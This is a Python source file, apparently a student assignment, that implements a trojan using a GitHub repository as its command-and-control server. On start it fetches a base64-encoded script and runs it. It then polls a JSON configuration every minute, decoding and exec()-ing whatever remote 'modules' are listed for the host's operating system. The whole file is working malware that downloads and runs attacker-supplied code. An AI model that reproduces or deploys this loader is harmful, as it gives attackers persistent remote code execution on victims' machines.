from github import Github
import json
import time
import base64
import subprocess
import platform

class Trojan():
    def __init__(self, repository_name, file_path, access_token):
        self.repository_name = repository_name
        self.file_path = file_path
        self.access_token = access_token
        self.run_OSChecker()

    def run_OSChecker(self):
        '''This function will run automatically accordingly when we first start our trojan'''
        g = Github(self.access_token)
        repo = g.get_repo(self.repository_name)
        file_content = repo.get_contents('OSChecker.py').decoded_content.decode('utf-8')
        code = self.base64_to_text(file_content)
        subprocess.run(['python', '-c', code])
           
    def read_json_file(self):
        '''Beschrijving'''
        try:
            g = Github(self.access_token)
            repo = g.get_repo(self.repository_name)
            file_content = repo.get_contents(self.file_path).decoded_content
            json_data = json.loads(file_content)
            return json_data
        except Exception as e:
            print(f"Error retrieving JSON file: {e}")
            return None

    def base64_to_text(self, encoded_string):
        '''This function is responsible for decoding from base64 to text'''
        decoded_bytes = base64.b64decode(encoded_string)
        decoded_text = decoded_bytes.decode('utf-8')
        return decoded_text

    def run(self):
        '''beschrijving'''
        try:
            my_os = platform.system()
            while True:
                json_data = self.read_json_file()
                if json_data and "modules" in json_data:
                    modules = json_data["modules"]
                    for module in modules:
                        module_activation = module.get("active")
                        module_name = module.get("name")
                        duration = module.get("duration", 0)
                        module_OS = module.get("OS_type")
                        encoded_module = module.get("path") 
                        cross_platform = module.get("cross_platform")
                            
                        if module_name and duration > 0 and encoded_module and module_activation and module_OS == my_os or cross_platform:
                            print(f"Executing module '{module_name}' for {duration} seconds...")
                            decoded_module = self.base64_to_text(encoded_module)
                                
                            try:
                                exec(decoded_module, globals())
                                time.sleep(duration)
                                print(f"Module '{module_name}' execution completed.")
                            except Exception as e:
                                print(f"Error executing module '{module_name}': {e}")       
                else:
                    pass
                time.sleep(60)
        except KeyboardInterrupt:
            pass

repository_name = "rsecurity12/python_opdracht"
file_path = "Configuration.json"
access_token = ''

trojan = Trojan(repository_name, file_path, access_token)
trojan.run()
 